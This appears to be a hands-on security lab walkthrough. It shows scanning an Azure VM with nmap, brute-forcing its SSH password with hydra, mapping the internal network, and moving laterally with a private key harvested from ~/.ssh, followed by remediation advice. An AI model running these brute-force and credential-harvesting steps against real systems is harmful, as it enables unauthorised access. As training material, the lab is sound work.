# Lab 01: Compromised VM

## Step 1: Connecting to the VM

1. **Check for open ports**:
   We can use nmap to scan for any open ports on our target IP address.

   ```bash
   nmap -sS -Pn <Public_IP>
   ```

    >[!NOTE]
    **-sS:** Performs a stealthy SYN scan to detect open ports.  
    **-Pn:** Skip ping sweep

2. **Attempt SSH**:  
    We see that port 22 is open, so Let’s start by trying to ssh into the VM:

    ```bash
    ssh azureuser@<Public_IP>
    ```

    If it prompts for a password, this indicates that the VM is not using a     secure authentication method like SSH keys. Let's try to crack the  password.

## Step 2: Crack the Password

1. **Check Hosting Information**:  
   We can use a site like [hostingchecker.com](https://hostingchecker.com) to determine if the machine is hosted in the cloud.  

   - If the machine is hosted on Azure, the default username is often `azureuser`, so let's try using that username first.

2. **Brute Force the Password**:  
   Tools like `hydra`, `ncrack`, and `medua` can be used for brute-forcing logins. Let's use `hydra` to perform our attack. We will need to provide a username and a list of passwords to try against. Let's try the 200 most common passwords of 2023 from [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/2023-200_most_used_passwords.txt):

   ```bash
   hydra -l azureuser -P /path/to/common_passwords.txt ssh://<Public_IP>
   ```

    > [!NOTE]
    **-l azureuser:** Specifies the username to use for the attack.  
    **-P /path/to/common_passwords.txt:** Points to a file containing a     list of common passwords.  
    **ssh://<Public_IP>:** Specifies the method and IP address.

## Step 3: Access the VM

Now, use the cracked credentials to SSH into the VM:

```bash
ssh azureuser@<Public_IP>
```

🎉 You’ve officially gained access to the VM! Remember, use your powers for good and always wear a white hat. But we’re not done yet—let’s explore further.

## Step 4: Explore the Network

There doesn't seem to be anything of use to us on this vm, so let's dig into the network.

### 4.1: Understanding the VM’s Internal Network

Run the following to check the internal IP of the current VM:

```bash
ifconfig
```

You’ll likely see an internal IP in the 10.0.0.x range (common for Azure VNets). This means the VM is part of a private network.

### 4.2: Discover Other Devices on the Network

We’ll ping all devices in the 10.0.0.x range to identify active hosts. We can use `fping` or `nmap` to send bulk ICMP echo probes (pings).

```bash
fping -g 10.0.0.1 10.0.0.254
```

>[!NOTE]
**-g:** Specifies the range of IPs to ping (e.g., 10.0.0.1 to 10.0.0.254).  
**-a** Shows only reachable hosts.  
**-q** Runs quietly (suppresses output except results).  

or

```bash
nmap -sS 10.0.0.1-254
```

>[!NOTE]
**-sS:** Performs a stealthy SYN scan to detect open ports.

### 4.3: Filter Active Devices

The tools above will output the devices that responsed, but if you want to verify, use the ARP cache to find devices that responded:

```bash
arp -a | grep 10.0.0. | grep ether
```

>[!NOTE]
**arp -a:** Lists devices in the ARP cache.  
**grep 10.0.0.:** Filters for devices on the 10.0.0.x subnet.  
**grep ether:** Ensures only devices with MAC addresses are shown (ignoring unresolved pings).  

## Step 5: Lateral Movement to Another VM

Hopefully you were able to find another vm on the network. Let's try to connect to it.

### 5.1: Attempt SSH with Existing Credentials

Let's first try to SSH using the same username and password:

```bash
ssh azureuser@<Internal_IP>
```

### 5.2: Permission Denied? Look for a Private Key

Do you see `Permission denied (publickey)`? Looks like they tried to beef up their security by using SSH keys instead of a password. But since we're already inside the compromised vm, let’s check for an SSH private key.

Navigate to the .ssh directory and look for a private key file, such as id_rsa.pem.:

```bash
cd ~/.ssh
ls
```

### 5.3: Use the Private Key for SSH

If you find a private key, use it to attempt access to the new VM:

```bash
ssh -i path/to/key azureuser@<Internal_IP>
```

## Step 6: Explore the Second VM

🎉 You’re in! Time to explore this second VM:

- Look for sensitive files.
- Check permissions or configurations for vulnerabilities.
- Use tools like sudo -l to see if privilege escalation is possible.

## Remediation (Optional...but only for this lab, not irl)

After completing the exercise, feel free to use the vulnerabilities you learned about to secure the vms.

Suggestions for improved security include:

1. Use Strong Authentication:
   - Disable password-based SSH authentication and use key pairs instead.
   - Use a passphrase on top of your private keys.

2. Restrict Network Access:
    - Update NSG rules to allow SSH only from specific trusted IPs.
    - Remove any broad rules like Allow Any or unrestricted inbound access.

3. Connect via Bastion
    - If your vm does not require a public IP, delete the public IP and connect through Azure Bastion instead.

4. Monitor and Audit Logs:
    - Enable logging for SSH access and network activities.
    - Use Azure Monitor and Security Center to detect unusual login attempts.

5. Harden the VM:
    - Apply least privilege principles.
    - Regularly update and patch the VM.
